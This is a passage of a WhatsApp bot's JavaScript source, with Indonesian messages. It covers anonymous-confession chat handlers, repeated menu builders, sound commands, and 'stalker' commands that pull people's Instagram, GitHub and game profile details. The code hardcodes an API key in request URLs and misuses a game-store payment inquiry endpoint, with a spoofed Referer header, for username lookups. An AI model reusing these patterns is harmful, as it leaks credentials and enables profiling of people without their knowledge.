NanoBotz.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await NanoBotz.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': {
let roof = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
if (!roof) return reply("Belum ada sesi menfess");
let room = Object.values(NanoBotz.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");
let other = [room.a, room.b].find(user => user !== m.sender);
room.b = m.sender;
room.state = 'CHATTING';
NanoBotz.menfes[room.id] = {...room};
await NanoBotz.sendMessage(other, { 
  text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, 
  mentions: [m.sender]
});
NanoBotz.sendMessage(m.chat, { 
  text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
});
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
roof = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(NanoBotz.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(NanoBotz.menfes).find(menpes => menpes.state == 'WAITING')
NanoBotz.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await NanoBotz.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
reply("Menfess berhasil di tolak 🤚")
delete NanoBotz.menfes[roof.id]
}
break
 case 'stopconfess': case 'stopmenfess': {
 //find = Object.values(NanoBotz.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
NanoBotz.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply("ok")
delete NanoBotz.menfes[find.id]
}
 break

case 'groupmenu': {
  let nano_sad = `${groupmenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

case 'funmenu': { 
  let nano_sad = `${funmenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'stalkermenu': {let nano_sad = `${stalkermenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'randomphotomenu': {let nano_sad = `${randomphotomenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'randomvideomenu': {
  let nano_sad = `${randomvideomenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'ephoto360menu': {
  let nano_sad = `${ephoto360menu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'stickermenu': {
   let nano_sad = `${stickermenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'aimenu': {
   let nano_sad = `${aimenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

//======================================================================  







































//======================================================================
//case sound
break
case 'woi':
case 'bacot':
case 'ayank':
case 'asu':
case 'gelay':
case 'anjay':
case 'siuu':
viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
let sound
if (/woi|bacot|ayank|asu|gelay|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await NanoBotz.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://instagram.com/Cyaa_ches1', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://instagram.com/Cyaa_ches1',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await NanoBotz.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: m})
break
//======================================================================  










//======================================================================
//case stalker
case 'igstalk2':{
reply(mess.wait)
if (!q) return replynano(`Example ${prefix+command} unicorn_xeon`)
reply(mess.wait)
const aj = await igstalk(`${q}`)
NanoBotz.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
reply(mess.wait)
if (!q) return replynano(`Example ${prefix+command} 946716486`)
reply(mess.wait)
const data = await fetchJson(`https://skizo.tech/api/stalk/game/FREEFIRE?apikey=nanogembul&id=${encodeURIComponent(text)}&zone=false`)
const data1 = data.data.roles
replynano(`*/ Free Fire Stalker \\*

Id : ${data1.player_id}
Nickname : ${data1.role}`)
}
break
case 'mlstalk': {
if (!text) return reply(`Contoh penggunaan:\n${prefix + command} id|zona id\n\nEx.\n${prefix + command} 157228049|2241`)
 async function mlstalk(id, zoneId) {
    return new Promise(async (resolve, reject) => {
      axios
        .post(
          'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
          new URLSearchParams(
            Object.entries({
              productId: '1',
              itemId: '2',
              catalogId: '57',
              paymentId: '352',
              gameId: id,
              zoneId: zoneId,
              product_ref: 'REG',
              product_ref_denom: 'AE',
            })
          ),
          {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              Referer: 'https://www.duniagames.co.id/',
              Accept: 'application/json',
            },
          }
        )
        .then((response) => {
          resolve(response.data.data.gameDetail)
        })
        .catch((err) => {
          reject(err)
        })
    })
}

var { userName } = await mlstalk(text.split('|')[0], text.split('|')[1]).catch(async _ => await reply("User tidak di temukan"))
var vf = `*MOBILE LEGENDS STALK*

*ID: ${text.split('|')[0]}*
*ZONA ID: ${text.split('|')[1]}*
*Username: ${userName ? userName : "Kosong"}*`
reply(vf)
         }
break


case 'ghstalk': case 'githubstalk':{
  reply(mess.wait)
  if (!q) return replynano(`Example ${prefix+command} DGXeon`)
  reply(mess.wait)
  aj = await githubstalk.githubstalk(`${q}`)
  NanoBotz.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
  `*/ Github Stalker \\*
  
  Username : ${aj.username}
  Nickname : ${aj.nickname}
  Bio : ${aj.bio}
  Id : ${aj.id}
  Nodeid : ${aj.nodeId}
  Url Profile : ${aj.profile_pic}
  Url Github : ${aj.url}
  Type : ${aj.type}
  Admin : ${aj.admin}
  Company : ${aj.company}
  Blog : ${aj.blog}
  Location : ${aj.location}
  Email : ${aj.email}
  Public Repo : ${aj.public_repo}
  Public Gists : ${aj.public_gists}
  Followers : ${aj.followers}
  Following : ${aj.following}
  Created At : ${aj.ceated_at}
  Updated At : ${aj.updated_at}` }, { quoted: m } )
  }
  break

  case 'instagramstalk':
    case 'igstalk': {
    if (!args[0]) return replynano(`Enter Instagram Username\n\nExample: ${prefix + command} danznano`)
    const data = await fetchJson(`https://skizo.tech/api/igstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
    NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
        try {
        let res = await fg.igStalk(args[0])
        let te = `
    ┌──「 *STALKING* 
    ▢ *🔖Name:* ${data.fullname} 
    ▢ *🔖Username:* ${data.username}
    ▢ *👥Follower:* ${data.followers}
    ▢ *🫂Following:* ${data.following}
    ▢ *📌Bio:* ${data.bio}
    ▢ *🏝️Posts:* ${data.posts}
    ▢ *🔗 Link* : https://instagram.com/${data.username.replace(/^@/, '')}
    └────────────`
         await NanoBotz.sendMessage(m.chat, {image: { url: data.photo_profile }, caption: te }, {quoted: m})
          } catch {
            replynano(`Pastikan nama pengguna berasal dari *Instagram*`)
          }
    }
    break
    case 'tiktokstalk':
    case 'ttstalk': {
    if (!args[0]) return replynano(`Masukan Tiktok Username\n\nExample: ${prefix + command} danznano`)
